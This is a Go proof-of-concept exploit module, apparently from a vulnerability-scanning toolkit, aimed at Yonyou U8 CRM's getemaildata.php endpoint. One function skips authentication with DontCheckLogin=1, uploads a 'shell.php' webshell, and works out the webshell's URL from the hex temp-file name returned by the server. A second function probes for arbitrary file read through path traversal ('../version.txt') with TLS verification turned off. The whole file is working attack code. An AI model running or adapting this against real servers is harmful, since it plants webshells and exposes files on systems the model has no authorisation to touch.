package poc

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
)

type Response struct {
	Success  bool     `json:"success"`
	Code     string   `json:"code"`
	Message  string   `json:"message"`
	Files    []string `json:"files"`
	FilePath string   `json:"filePath"`
}

func CRMgetemaildata_upload(target string) {
	url := strings.TrimRight(target, "/")
	filePath := "shell.php"

	// 读取文件内容
	content, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Println("[-] 读取文件失败:", err)
	}

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	fileFieldWriter, _ := writer.CreateFormFile("file", "shell.php ")
	fileFieldWriter.Write(content)

	contentType := writer.FormDataContentType()
	writer.Close()

	request, _ := http.NewRequest("POST", url+"/ajax/getemaildata.php?DontCheckLogin=1", body)
	request.Header.Set("Content-Type", contentType)

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println("Error:", err)
	}
	defer response.Body.Close()

	responseBody, _ := io.ReadAll(response.Body)
	msg := regexp.MustCompile(`tmpfile`).MatchString(string(responseBody))
	if response.StatusCode == http.StatusOK && msg {
		log.Println("[+] 存在用友 U8 CRM getemaildata.php 任意文件上传漏洞")
		var resp Response
		err = json.Unmarshal(responseBody, &resp)
		if err != nil {
			log.Println("[-] Error parsing JSON:", err)
		}

		lastIndex := strings.LastIndex(resp.FilePath, "\\")

		if lastIndex != -1 && lastIndex < len(resp.FilePath)-1 {
			result := resp.FilePath[lastIndex+1:]
			tmpIndex := strings.Index(result, ".tmp")

			if tmpIndex != -1 {
				result1 := result[:tmpIndex]
				name := strings.TrimLeft(result1, "mht")
				decimal, err := strconv.ParseInt(name, 16, 64)
				if err != nil {
					log.Println("[-] Error converting hex to decimal:", err)
				}
				decimal -= 1
				hexResult := strconv.FormatInt(decimal, 16)
				result2 := string(hexResult)
				log.Println("[+] 文件路径:" + url + "/tmpfile/upd" + result2 + ".tmp.php")
			} else {
				log.Println("[-] 获取文件路径错误")
			}
		} else {
			log.Println("[-] 获取文件路径错误")
		}
	} else {
		log.Println("[-] 不存在用友 U8 CRM getemaildata.php 任意文件上传漏洞")
	}
}

func CRMgetemaildata_readfile(target string) {
	url := strings.TrimRight(target, "/")
	req, _ := http.NewRequest("GET", url+"/ajax/getemaildata.php?DontCheckLogin=1&filePath=../version.txt", nil)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println("[-]请求发送失败:", err)
	}
	defer resp.Body.Close()
	respbody, _ := io.ReadAll(resp.Body)
	msg := regexp.MustCompile("patch").MatchString(string(respbody))
	if resp.StatusCode == http.StatusOK && msg {
		log.Println("[+] 存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞.")
		log.Println(url + "/ajax/getemaildata.php?DontCheckLogin=1&filePath=../version.txt")
	} else {
		log.Println("[-] 不存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞.")
	}
}
